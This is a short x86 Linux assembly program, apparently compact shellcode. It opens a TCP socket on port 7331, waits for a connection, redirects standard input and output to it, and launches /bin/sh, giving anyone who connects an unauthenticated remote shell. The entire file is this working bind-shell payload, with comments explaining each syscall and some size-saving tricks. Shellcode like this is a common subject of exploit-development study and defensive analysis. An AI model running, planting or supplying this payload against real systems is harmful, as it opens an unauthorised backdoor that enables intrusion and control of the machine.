section .text
global main

main:
    xor edx, edx        ; Zero-out EDX for later use
    xor edi, edi        ; Zero-out EDI
    xor edi, 0x66       ; Set 0x66 in EDI for later

    ; sockfd = socket(PF_INET, SOCK_STREAM, 0)
    mov eax, edi        ; SYS_SOCKETCALL
    mov ebx, edx        ; Zero-out EBX
    mov bl, 0x1         ; SYS_SOCKET
    push edx            ; 0
    push byte 0x1       ; SOCK_STREAM
    push byte 0x2       ; PF_INET
    mov ecx, esp        ; Address of socket arguments
    int 0x80            ; Exec syscall

    ; We need the result later
    mov esi, eax        ; Store ref to sockfd in ESI

    ; bind(sockid, struct addr, addrlen)
    mov eax, edi        ; SYS_SOCKETCALL
    inc ebx             ; SYS_BIND
    ; Setup struct addr
    push edx            ; 0.0.0.0 (this is why we needed EDX at line 5)
    push word 0xa31c    ; Port 7331
    push word 0x2       ; AF_INET
    mov ecx, esp        ; Store struct in ECX
    ; Setup bind arguments
    push 0x10           ; Length addr (16)
    push ecx            ; Struct addr
    push esi            ; Ref to sockfd
    mov ecx, esp        ; Address of bind arguments
    int 0x80            ; Exec syscall

    ; listen(sockid, 2)
    mov eax, edi        ; SYS_SOCKETCALL
    push ebx            ; Argument "2"
    inc ebx             ; SYS_LISTEN
    inc ebx             ; (2 bytes instead of 3 for "add ebx, 0x2")
    ; Setup arguments
    push esi            ; Ref to sockid
    mov ecx, esp        ; Address of listen arguments
    int 0x80            ; Exec syscall

    ; socketid = accept(sockfd, null, null)
    mov eax, edi        ; SYS_SOCKETCALL
    inc ebx             ; SYS_ACCEPT
    push edx            ; NULL (this is also why we needed EDX at line 5)
    push esi            ; Ref to sockid
    mov ecx, esp        ; Address of accept arguments
    int 0x80            ; Exec syscall

    ; dup2(socketid, 0)
    mov ebx, eax        ; Ref to socketid
    xor eax, eax        ; Zero-out EAX
    xor ecx, ecx        ; Zero-out ECX
    mov cl, 0x2         ; Set counter
duploop:
    mov al, 0x3f        ; SYS_DUP2
    int 0x80            ; Exec syscall
    dec ecx             ; Decrement ECX
    jns duploop         ; Loop

    ; execve("//bin/sh", NULL, NULL)
    xor eax, eax        ; Zero-out EAX
    mov al, 0x0b        ; SYS_EXECVE
    push edx            ; Push NULL character to stack
    push 0x68732f6e     ; "hs/n"
    push 0x69622f2f     ; "ib//"
    mov ebx, esp        ; Ref to "//bin/sh" from stack
    inc ecx             ; ECX to 0
    int 0x80            ; Exec syscall
